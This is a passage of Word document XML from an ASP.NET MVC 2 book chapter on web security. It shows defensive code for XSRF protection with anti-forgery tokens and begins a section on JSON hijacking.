          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00EF6E66">
        <w:rPr>
          <w:rPrChange w:id="294" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>vulnerable</w:instrText>
      </w:r>
      <w:ins w:id="295" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> action.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DE2917" w:rsidRDefault="00DE2917" w:rsidP="00DE2917">
      <w:pPr>
        <w:pStyle w:val="CodeListingCaption"/>
      </w:pPr>
      <w:r>
        <w:t>Listing 11.10 ValidateAntiForgeryTokenAttribute</w:t>
      </w:r>
      <w:ins w:id="296" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="0014436C">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
          <w:rPrChange w:id="297" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
            <w:rPr>
              <w:rStyle w:val="CodeinText"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>ValidateAntiForgeryTokenAttribute</w:instrText>
      </w:r>
      <w:ins w:id="298" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00DE2917" w:rsidRPr="00DE2917" w:rsidRDefault="00DE2917" w:rsidP="00DE2917">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00DE2917">
        <w:t>[ValidateAntiForgeryToken</w:t>
      </w:r>
      <w:ins w:id="299" w:author="Jeffrey" w:date="2010-03-15T16:35:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="003F2F87">
        <w:rPr>
          <w:rPrChange w:id="300" w:author="Jeffrey" w:date="2010-03-15T16:35:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>ValidateAntiForgeryToken</w:instrText>
      </w:r>
      <w:ins w:id="301" w:author="Jeffrey" w:date="2010-03-15T16:35:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00DE2917">
        <w:t>]</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">                #1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DE2917" w:rsidRPr="00DE2917" w:rsidRDefault="00DE2917" w:rsidP="00DE2917">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00DE2917">
        <w:t>public ViewResult Save(InputModel form)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DE2917" w:rsidRPr="00DE2917" w:rsidRDefault="00DE2917" w:rsidP="00DE2917">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00DE2917">
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DE2917" w:rsidRPr="00DE2917" w:rsidRDefault="00DE2917" w:rsidP="00DE2917">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00DE2917">
        <w:tab/>
        <w:t>return View(form);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DE2917" w:rsidRPr="00DE2917" w:rsidRDefault="00DE2917" w:rsidP="00DE2917">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00DE2917">
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DE2917" w:rsidRDefault="00DE2917" w:rsidP="00DE2917">
      <w:pPr>
        <w:pStyle w:val="CodeAnnotation"/>
      </w:pPr>
      <w:r>
        <w:t>#1 Protecting against XSRF</w:t>
      </w:r>
      <w:ins w:id="302" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00530C72">
        <w:rPr>
          <w:rPrChange w:id="303" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>XSRF</w:instrText>
      </w:r>
      <w:ins w:id="304" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00DE2917" w:rsidRDefault="00DE2917" w:rsidP="00DE2917">
      <w:pPr>
        <w:pStyle w:val="Body1"/>
      </w:pPr>
      <w:r>
        <w:t>Listing 11.11 shows the HTML helper</w:t>
      </w:r>
      <w:ins w:id="305" w:author="Jeffrey" w:date="2010-03-15T16:35:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="003F2F87">
        <w:rPr>
          <w:rPrChange w:id="306" w:author="Jeffrey" w:date="2010-03-15T16:35:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>HTML helper</w:instrText>
      </w:r>
      <w:ins w:id="307" w:author="Jeffrey" w:date="2010-03-15T16:35:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> we need in the form.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DE2917" w:rsidRDefault="00DE2917" w:rsidP="00DE2917">
      <w:pPr>
        <w:pStyle w:val="CodeListingCaption"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Listing 11.11 </w:t>
      </w:r>
      <w:r w:rsidR="00892B3C">
        <w:t>Adding the</w:t>
      </w:r>
      <w:r w:rsidR="008C50D3">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Html.AntiForgeryToken()</w:t>
      </w:r>
      <w:ins w:id="308" w:author="Jeffrey" w:date="2010-03-15T16:35:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="003F2F87">
        <w:rPr>
          <w:rPrChange w:id="309" w:author="Jeffrey" w:date="2010-03-15T16:35:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>Html.AntiForgeryToken()</w:instrText>
      </w:r>
      <w:ins w:id="310" w:author="Jeffrey" w:date="2010-03-15T16:35:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidR="008C50D3">
        <w:t xml:space="preserve"> helper outputs a hidden </w:t>
      </w:r>
      <w:r w:rsidR="00892B3C">
        <w:t xml:space="preserve">field </w:t>
      </w:r>
      <w:r w:rsidR="008C50D3">
        <w:t>that allows the server to verify the source of the request.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DE2917" w:rsidRPr="00DE2917" w:rsidRDefault="00DE2917" w:rsidP="00DE2917">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00DE2917">
        <w:t>&lt;form method="post" action="/home/save"&gt;</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DE2917" w:rsidRPr="00DE2917" w:rsidRDefault="00DE2917" w:rsidP="00DE2917">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00DE2917">
        <w:t xml:space="preserve">    &lt;%= Html.AntiForgeryToken()</w:t>
      </w:r>
      <w:ins w:id="311" w:author="Jeffrey" w:date="2010-03-15T16:35:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="003F2F87">
        <w:rPr>
          <w:rPrChange w:id="312" w:author="Jeffrey" w:date="2010-03-15T16:35:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>Html.AntiForgeryToken()</w:instrText>
      </w:r>
      <w:ins w:id="313" w:author="Jeffrey" w:date="2010-03-15T16:35:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00DE2917">
        <w:t xml:space="preserve"> %&gt;</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">          #1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DE2917" w:rsidRPr="00DE2917" w:rsidRDefault="00DE2917" w:rsidP="00DE2917">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00DE2917">
        <w:t xml:space="preserve">    &lt;label for="Name"&gt;Name:&lt;/label&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DE2917" w:rsidRPr="00DE2917" w:rsidRDefault="00DE2917" w:rsidP="00DE2917">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00DE2917">
        <w:t xml:space="preserve">    &lt;%= Html.TextBox("Name") %&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DE2917" w:rsidRPr="00DE2917" w:rsidRDefault="00DE2917" w:rsidP="00DE2917">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00DE2917">
        <w:t xml:space="preserve">    &lt;button type="submit"&gt;Submit&lt;/button&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DE2917" w:rsidRDefault="00DE2917" w:rsidP="00DE2917">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00DE2917">
        <w:t>&lt;/form&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DE2917" w:rsidRDefault="00DE2917" w:rsidP="00DE2917">
      <w:pPr>
        <w:pStyle w:val="CodeAnnotation"/>
      </w:pPr>
      <w:r>
        <w:t>#1 This provides a secure token</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DE2917" w:rsidRDefault="000D356E" w:rsidP="000D356E">
      <w:pPr>
        <w:pStyle w:val="Body1"/>
      </w:pPr>
      <w:r>
        <w:t>Once the token and the attribute are in place, submissions from the site using both will succeed, but attackers will no longer be able to formulate XSRF</w:t>
      </w:r>
      <w:ins w:id="314" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00530C72">
        <w:rPr>
          <w:rPrChange w:id="315" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>XSRF</w:instrText>
      </w:r>
      <w:ins w:id="316" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> attacks. If they try, an exception like the one shown in figure 11.8 appears.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D356E" w:rsidRDefault="000D356E" w:rsidP="000D356E">
      <w:r w:rsidRPr="000D356E">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="4800600" cy="384564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4800600" cy="3845642"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln w="9525">
                      <a:noFill/>
                      <a:miter lim="800000"/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D356E" w:rsidRDefault="000D356E" w:rsidP="000D356E">
      <w:pPr>
        <w:pStyle w:val="FigureCaption"/>
      </w:pPr>
      <w:r>
        <w:t>Figure 11.8 An exception is thrown if the request is not accompanied by a special token</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D356E" w:rsidRDefault="000D356E" w:rsidP="000D356E">
      <w:pPr>
        <w:pStyle w:val="Body1"/>
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The appropriate time to incorporate </w:t>
      </w:r>
      <w:r w:rsidRPr="00DE2917">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>ValidateAntiForgeryTokenAttribute</w:t>
      </w:r>
      <w:ins w:id="317" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
        <w:r w:rsidR="004962CC">
          <w:rPr>
            <w:rStyle w:val="CodeinText"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="0014436C">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
          <w:rPrChange w:id="318" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
            <w:rPr>
              <w:rStyle w:val="CodeinText"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>ValidateAntiForgeryTokenAttribute</w:instrText>
      </w:r>
      <w:ins w:id="319" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:rPr>
            <w:rStyle w:val="CodeinText"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D356E">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> on actions that accept form submissions is now. Public facing websites and intranet sites are vulnerable</w:t>
      </w:r>
      <w:ins w:id="320" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:rPr>
            <w:rStyle w:val="CodeinText"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="16"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00EF6E66">
        <w:rPr>
          <w:rPrChange w:id="321" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>vulnerable</w:instrText>
      </w:r>
      <w:ins w:id="322" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:rPr>
            <w:rStyle w:val="CodeinText"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="16"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D356E">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> to XSRF</w:t>
      </w:r>
      <w:ins w:id="323" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:rPr>
            <w:rStyle w:val="CodeinText"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="16"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00530C72">
        <w:rPr>
          <w:rPrChange w:id="324" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>XSRF</w:instrText>
      </w:r>
      <w:ins w:id="325" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:rPr>
            <w:rStyle w:val="CodeinText"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="16"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D356E">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>, and this quick task is required to develop a secure application.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D356E" w:rsidRPr="00DE2917" w:rsidRDefault="000D356E" w:rsidP="000D356E">
      <w:pPr>
        <w:pStyle w:val="Body"/>
      </w:pPr>
      <w:r>
        <w:t>In the next section we'll look at JSON</w:t>
      </w:r>
      <w:ins w:id="326" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00790D2C">
        <w:rPr>
          <w:rPrChange w:id="327" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>JSON</w:instrText>
      </w:r>
      <w:ins w:id="328" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> hijacking</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="005828C7">
        <w:instrText>JSON hijacking</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t>, another attack</w:t>
      </w:r>
      <w:ins w:id="329" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="00D21A77">
        <w:rPr>
          <w:rPrChange w:id="330" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>attack</w:instrText>
      </w:r>
      <w:ins w:id="331" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> that requires developers using ASP.NET MVC 2 take certain precautions.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003B62DA" w:rsidRDefault="003B62DA" w:rsidP="003B62DA">
      <w:pPr>
        <w:pStyle w:val="Head2"/>
      </w:pPr>
      <w:r>
        <w:t>11.3.3 JSON</w:t>
      </w:r>
      <w:ins w:id="332" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00790D2C">
        <w:rPr>
          <w:rPrChange w:id="333" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>JSON</w:instrText>
      </w:r>
      <w:ins w:id="334" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> Hijacking</w:t>
      </w:r>
      <w:ins w:id="335" w:author="Jeffrey" w:date="2010-03-15T16:35:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00790D2C">
        <w:rPr>
          <w:rPrChange w:id="336" w:author="Jeffrey" w:date="2010-03-15T16:35:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>JSON Hijacking</w:instrText>
      </w:r>
      <w:ins w:id="337" w:author="Jeffrey" w:date="2010-03-15T16:35:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="000D356E" w:rsidRDefault="000D356E" w:rsidP="000D356E">
      <w:pPr>
        <w:pStyle w:val="Body1"/>
      </w:pPr>
      <w:r>
        <w:t>JSON</w:t>
      </w:r>
      <w:ins w:id="338" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00790D2C">
        <w:rPr>
          <w:rPrChange w:id="339" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>JSON</w:instrText>
      </w:r>
      <w:ins w:id="340" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="009439E4">
        <w:t xml:space="preserve">(pronounced like the English male name, Jason) </w:t>
      </w:r>
      <w:r>
        <w:t>hijacking is</w:t>
      </w:r>
      <w:r w:rsidR="00F55EC0">
        <w:t xml:space="preserve"> a rare hack</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> sim</w:t>
      </w:r>
      <w:r w:rsidR="00D963F0">
        <w:t>ilar to XSRF</w:t>
      </w:r>
      <w:ins w:id="341" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00530C72">
        <w:rPr>
          <w:rPrChange w:id="342" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>XSRF</w:instrText>
      </w:r>
      <w:ins w:id="343" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00D963F0">
        <w:t>, except it's targe</w:t>
      </w:r>
      <w:r>
        <w:t>ted to request secure JSON from vulnerable</w:t>
      </w:r>
      <w:ins w:id="344" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00EF6E66">
        <w:rPr>
          <w:rPrChange w:id="345" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>vulnerable</w:instrText>
      </w:r>
      <w:ins w:id="346" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> applications.  The JSON hijacking</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="005828C7">
        <w:instrText>JSON hijacking</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> process involves several steps:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D356E" w:rsidRDefault="000D356E" w:rsidP="000D356E">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A conspiring site, via JavaScript</w:t>
      </w:r>
      <w:ins w:id="347" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
